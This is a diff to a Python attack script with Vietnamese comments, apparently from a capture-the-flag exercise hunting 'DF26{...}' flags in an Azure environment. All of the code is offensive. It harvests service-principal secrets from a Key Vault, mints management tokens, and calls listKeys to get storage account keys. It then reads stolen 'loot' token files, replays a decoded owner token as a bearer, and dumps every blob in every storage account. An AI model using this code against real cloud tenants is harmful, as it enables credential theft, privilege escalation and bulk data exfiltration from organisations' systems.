@@ -20,7 +20,7 @@ def tok(c,x,sc):
 def hit(tag,s):
     for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
 def sk(acct,key,path,params):
-    date=datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
+    date=datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
     ch=f"x-ms-date:{date}\nx-ms-version:{XV}\n"; cr=f"/{acct}{path}"
     for k in sorted(params):cr+=f"\n{k}:{params[k]}"
     sts="\n".join(["GET","","","","","","","","","","",""])+"\n"+ch+cr
@@ -31,6 +31,11 @@ def sk(acct,key,path,params):
     except Exception as e:
         try:return "ERR:"+e.read().decode()[:150]
         except:return "ERR:"+str(e)
+def readall(acct,key):
+    for c in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,"/",{"comp":"list"})):
+        for blob in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,f"/{c}",{"restype":"container","comp":"list"})):
+            d=sk(acct,key,f"/{c}/{urllib.parse.quote(blob)}",{});hit(f"{acct}/{c}/{blob}",d)
+            print(f"   {acct}/{c}/{blob} ({len(d)}b):",d[:250].replace(chr(10)," "))
 PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
 sps=[]
 for s in json.loads(req(PV+"/secrets?api-version=7.4",VT))["value"]:
@@ -38,28 +43,38 @@ for s in json.loads(req(PV+"/secrets?api-version=7.4",VT))["value"]:
         j=json.loads(json.loads(req(s["id"]+"?api-version=7.4",VT))["value"]);sps.append((s["id"].rsplit("/",1)[-1],j["appId"],j["clientSecret"]))
     except:pass
 ids={}
-for name,cid,sec in sps:
-    at=tok(cid,sec,"https://management.azure.com/.default")
+for n,c,x in sps:
+    at=tok(c,x,"https://management.azure.com/.default")
     if not at:continue
-    r=req(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",at)
-    try:
-        for x in json.loads(r).get("value",[]):
-            if x.get("type")=="Microsoft.Storage/storageAccounts":ids[x["name"]]=x["id"]
-    except:pass
+    for r in json.loads(req(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",at)).get("value",[]):
+        if r.get("type")=="Microsoft.Storage/storageAccounts":ids[r["name"]]=r["id"]
     if ids:break
-print("storage ids:",list(ids))
-for name,cid,sec in sps:
-    at=tok(cid,sec,"https://management.azure.com/.default")
+# cilogs key qua sync-service
+ck=None
+for n,c,x in sps:
+    at=tok(c,x,"https://management.azure.com/.default")
     if not at:continue
+    lk=req(f"https://management.azure.com{ids['sttblcilogsprodx3euoz']}/listKeys?api-version=2023-01-01",at,method="POST",data=b"")
+    if '"keys"' in lk:ck=json.loads(lk)["keys"][0]["value"];break
+print("cilogs key:",bool(ck))
+# đọc armowner_token + mi_loot full
+aot=None
+if ck:
+    raw=sk("sttblcilogsprodx3euoz",ck,"/loot/armowner_token.json",{})
+    try:aot=json.loads(raw).get("armowner_token")
+    except:print("aot raw:",raw[:200])
+    mi=sk("sttblcilogsprodx3euoz",ck,"/loot/mi_loot_1792639046.json",{});hit("mi_loot",mi);print("mi_loot:",mi[:600])
+if aot and aot.count(".")==2:
+    p=aot.split(".")[1];p+="="*(-len(p)%4)
+    cl=json.loads(base64.urlsafe_b64decode(p))
+    print("AOT aud=",cl.get("aud"),"appid=",cl.get("appid"),"oid=",cl.get("oid"),"roles=",cl.get("roles"),"exp=",cl.get("exp"))
+    # dùng làm ARM bearer: listKeys mọi account rồi đọc
     for acct,rid in ids.items():
-        lk=req(f"https://management.azure.com{rid}/listKeys?api-version=2023-01-01",at,method="POST",data=b"")
+        lk=req(f"https://management.azure.com{rid}/listKeys?api-version=2023-01-01",aot,method="POST",data=b"")
         if '"keys"' in lk:
-            key=json.loads(lk)["keys"][0]["value"];print(f"[{name}] KEY {acct} OK")
-            for c in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,"/",{"comp":"list"})):
-                for blob in re.findall(r'<Name>([^<]+)</Name>',sk(acct,key,f"/{c}",{"restype":"container","comp":"list"})):
-                    data=sk(acct,key,f"/{c}/{urllib.parse.quote(blob)}",{})
-                    hit(f"{acct}/{c}/{blob}",data);print(f"   {acct}/{c}/{blob} ({len(data)}b):",data[:300].replace(chr(10)," "))
-        elif "ERR" not in lk[:4]:
-            pass
+            print(f"AOT listKeys {acct} OK");readall(acct,json.loads(lk)["keys"][0]["value"])
+        else:print(f"AOT listKeys {acct}:",lk[:90])
+else:
+    print("armowner_token không phải JWT hợp lệ:",str(aot)[:80])
 print("== done ==")
 PY
